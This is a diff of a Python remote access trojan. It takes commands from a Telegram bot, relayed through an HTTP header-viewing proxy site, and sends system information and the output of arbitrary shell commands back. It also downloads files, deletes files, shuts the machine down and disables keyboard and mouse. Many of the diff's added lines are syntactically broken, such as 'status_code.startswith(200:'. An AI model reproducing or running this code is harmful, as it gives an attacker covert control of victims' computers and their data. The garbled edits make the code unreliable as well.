@@ -55,21 +55,21 @@ if check_internret():
     def send_msg(message, token=token, id=id):
         try:
             url = f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={message}"
-            data = {"UrlBox":url,
-                    "AgentList":"Internet Explorer",
-                    "VersionsList":"HTTP/1.1",
-                    "MethodList":"GET"}
+            data = {"UrlBox"): url,
+                    "AgentList"): "Internet Explorer",
+                    "VersionsList"): "HTTP/1.1",
+                    "MethodList"): "GET"}
             RATg = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
-            if RATg.status_code == 200: return True
+            if RATg.status_code.startswith(200: return True
             else: return False
         except: return False
     def read_msg(token=token):
         try:
             url = f"https://api.telegram.org/bot{token}/GetUpdates"
-            data = {"UrlBox":url,
-                    "AgentList":"Internet Explorer",
-                    "VersionsList":"HTTP/1.1",
-                    "MethodList":"GET"}
+            data = {"UrlBox"): url,
+                    "AgentList"): "Internet Explorer",
+                    "VersionsList"): "HTTP/1.1",
+                    "MethodList"): "GET"}
             source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data).content.decode()
             soup = BeautifulSoup(source, "html.parser")
             find_tag = json.loads(str(soup.findAll("pre"))[61:-7])
@@ -80,10 +80,10 @@ if check_internret():
         while True:
             try:
                 command = read_msg()
-                if command == "/pass": pass
+                if command.startswith("/pass"):  pass
                 else:
-                    if command == "/check": send_msg("This is check message")
-                    if command == "/sysinfo":
+                    if command.startswith("/check"):  send_msg("This is check message")
+                    if command.startswith("/sysinfo"): 
                         try:
                             u = uname()
                             info = f""" SYSINFO:    
@@ -97,7 +97,7 @@ if check_internret():
     User: {getuser()}"""
                             send_msg(info)
                         except: send_msg("Error;")
-                    if command == "/open_site":
+                    if command.startswith("/open_site"): 
                         try:
                             send_msg("write website URL(10 seconds):")
                             sleep(10)
@@ -105,24 +105,24 @@ if check_internret():
                             webbrowser.open_new_tab(data)
                             send_msg(f"{data} is complete opened.")
                         except: send_msg("Error;")
-                    if command == "/stop":
+                    if command.startswith("/stop"): 
                         try:
                             send_msg("When you stop this. you cant connect again. if you are sure send Y if not send N(in 10 seconds): ")
                             sleep(10)
                             text = read_msg()
-                            if text == "Y" or text == "y": 
+                            if text.startswith("Y" or text.startswith("y"):  
                                 send_msg(f"Tunnel is closed at {strftime("%H : %M : %S")}.")
                                 exit()
                             else: 
                                 send_msg("Task is closed. Dont worry.")
                         except: send_msg("Error;")
-                    if command == "/shutdown": 
+                    if command.startswith("/shutdown"):  
                         try:
                             send_msg("System is turned off")
                             getoutput("shutdown now")
                             send_msg("Its turned off complete")
                         except: send_msg("Error;")
-                    if command == "/shell":
+                    if command.startswith("/shell"): 
                         try:
                             send_msg("write cmd command(10 seconds):")
                             sleep(10)
@@ -130,7 +130,7 @@ if check_internret():
                             out = getoutput(data)
                             send_msg("This is the response:\n" + out)
                         except: send_msg("Error;")
-                    if command == "/download":
+                    if command.startswith("/download"): 
                         try:
                             send_msg("write file url(in 10 seconds):")
                             sleep(10)
@@ -142,7 +142,7 @@ if check_internret():
                             else: wget.download(url)
                             send_msg("File is downloaded.")
                         except: send_msg("Error;")
-                    if command == "/check_exist":
+                    if command.startswith("/check_exist"): 
                         try:
                             send_msg("write your file address(in 8 seconds):")
                             sleep(8)
@@ -154,15 +154,15 @@ if check_internret():
                             else: os.Check_exist(File_name=file)
                             send_msg(f"This is the response:\n{state}")
                         except: send_msg("Error;")
-                    if command == "/commands": 
+                    if command.startswith("/commands"):  
                         commands_txt = """"""
                         for i in range(len(commands)):
                             commands_txt += f"{i+1}. {commands[i]}\n"
                         send_msg(commands_txt)
-                    if command == "/whereami": 
+                    if command.startswith("/whereami"):  
                         try: send_msg(os.Get_code_address())
                         except: send_msg("Error;")
-                    if command == "/mkdir":
+                    if command.startswith("/mkdir"): 
                         try:
                             send_msg("write directory name(in 10 seconds):")
                             sleep(10)
@@ -170,7 +170,7 @@ if check_internret():
                             os.Create_directory(name)
                             send_msg(f"{name} Directory is created.")
                         except: send_msg("Error;")
-                    if command == "/rm": 
+                    if command.startswith("/rm"):  
                         try:
                             send_msg("write file name(in 10 seconds):")
                             sleep(10)
@@ -185,7 +185,7 @@ if check_internret():
                                 remove(file)
                                 send_msg(f"{file} is removed.")
                         except: send_msg("Error;")
-                    if command == "/create_file":
+                    if command.startswith("/create_file"): 
                         try:
                             send_msg("write your file name(in 10 seconds):")
                             sleep(10)
@@ -196,7 +196,7 @@ if check_internret():
                             with open(name, "w") as writer: writer.write(text)
                             send_msg(f"{name} is created.")
                         except: send_msg("Error;")
-                    if command == "/show_error": 
+                    if command.startswith("/show_error"):  
                         try:
                             send_msg("write the title of error message(in 10 seconds):")
                             sleep(10)
@@ -206,7 +206,7 @@ if check_internret():
                             text = read_msg()
                             messagebox.showerror(title, text)
                         except: send_msg("Error;")
-                    if command == "/show_info": 
+                    if command.startswith("/show_info"):  
                         try:
                             send_msg("write the title of info message(in 10 seconds):")
                             sleep(10)
@@ -216,7 +216,7 @@ if check_internret():
                             text = read_msg()
                             messagebox.showinfo(title, text)
                         except: send_msg("Error;")
-                    if command == "/show_warning": 
+                    if command.startswith("/show_warning"):  
                         try:
                             send_msg("write the title of warning message(in 10 seconds):")
                             sleep(10)
@@ -226,7 +226,7 @@ if check_internret():
                             text = read_msg()
                             messagebox.showwarning(title, text)
                         except: send_msg("Error;")
-                    if command == "/voice":
+                    if command.startswith("/voice"): 
                         try:
                             send_msg("write your text(in 10 seconds):")
                             sleep(10)
@@ -234,7 +234,7 @@ if check_internret():
                             voice = Hub.Voice(text)
                             voice.Say()
                         except: send_msg("Error;")
-                    if command == "/dis_all":
+                    if command.startswith("/dis_all"): 
                         try:
                             keyboard.Disable_keyboard()
                             mouse.Disable_mouse()
@@ -250,7 +250,7 @@ if check_internret():
                             mouse.Enable_mouse()
                             send_msg("Mouse and Keyboard is disabled.")
                         except: send_msg("Error;")
-                    if command == "/chdir":
+                    if command.startswith("/chdir"): 
                         try:
                             send_msg("write the address you want to go(in 10 seconds):")
                             sleep(10)
@@ -258,7 +258,7 @@ if check_internret():
                             chdir(addr)
                             send_msg(f"address changed to {addr}")
                         except: send_msg("Error;")
-                    if command == "/localhost":
+                    if command.startswith("/localhost"): 
                         try:
                             send_msg("write your port(in 8 seconds):")
                             sleep(8)
@@ -266,7 +266,7 @@ if check_internret():
                             Popen(f"python -m http.server {port} -b {local_ip}", shell=True)
                             send_msg(f"Localhost is started at: http://{local_ip}:{port}")
                         except: send_msg("Error;")
-                    if command == "/open_app":
+                    if command.startswith("/open_app"): 
                         try:
                             send_msg("write complete name of application(in 10 seconds || example: cmd.exe):")
                             sleep(10)
@@ -277,7 +277,7 @@ if check_internret():
                             except FileNotFoundError:
                                 send_msg("File not found.")
                         except: send_msg("Error;")
-                    if command == "/write_word":
+                    if command.startswith("/write_word"): 
                         try:
                             send_msg("write your text(in 5 seconds):")
                             sleep(5)
@@ -285,22 +285,22 @@ if check_internret():
                             write(text)
                             send_msg(f"{text} is writed")
                         except: send_msg("Error;")
-                    if command == "/hotkey":
+                    if command.startswith("/hotkey"): 
                         try:
                             send_msg("write your hotkeys(in 10 seconds || split with space):")
                             sleep(10)
                             all_key = str(read_msg()).split(" ")
                             len_key = len(all_key)
-                            if len_key == 1 and len_key != 0: hotkey(all_key[0])
+                            if len_key.startswith(1 and len_key != 0: hotkey(all_key[0])
                             else: hotkey(all_key[0], all_key[1])
                         except: send_msg("Error;")
-                    if command == "/press_enter":
+                    if command.startswith("/press_enter"): 
                         try: hotkey("enter")
                         except: send_msg("Error;")
-                    if command == "/alt_f4":
+                    if command.startswith("/alt_f4"): 
                         try: hotkey("alt", "f4")
                         except: send_msg("Error;")
-                    if command == "/find_all":
+                    if command.startswith("/find_all"): 
                         try:
                             send_msg("write limit of find(in 5 seconds):")
                             sleep(5)
@@ -312,12 +312,12 @@ if check_internret():
                             all_files = all_files.split("\n")
                             out = """"""
                             for i in range(len(all_files)):
-                                if i + 1 == limit: break
+                                if i + 1.startswith(limit: break
                                 else:
                                     out += f"{i+1}. {all_files[i]}\n"
                             send_msg(out)
                         except: send_msg("Error;")
-                    if command == "/ip_info":
+                    if command.startswith("/ip_info"): 
                         try:
                             out = getoutput("ip addr show")
                             send_msg(out)
